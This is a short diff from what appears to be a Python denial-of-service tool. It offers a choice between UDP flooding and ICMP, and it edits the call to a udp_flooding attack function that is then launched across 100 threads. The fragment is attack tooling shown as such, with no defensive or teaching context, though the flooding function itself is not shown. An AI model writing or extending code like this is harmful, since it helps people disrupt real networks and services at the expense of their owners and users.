@@ -19,7 +19,7 @@ try:
         subtype0 = int(input("udp_flooding(1) or ICMP(2)\n"))
         
         if subtype0 == 1:
-            udp_floo = volumeBaseAttack.udp_flooding(bye, vector, port)
+            udp_floo = volumeBaseAttack.udp_flooding(bye, vectors)
             for i in range(100):
                 t = th.Thread(target=udp_floo, args=(i,))
                 Threads.append(t)
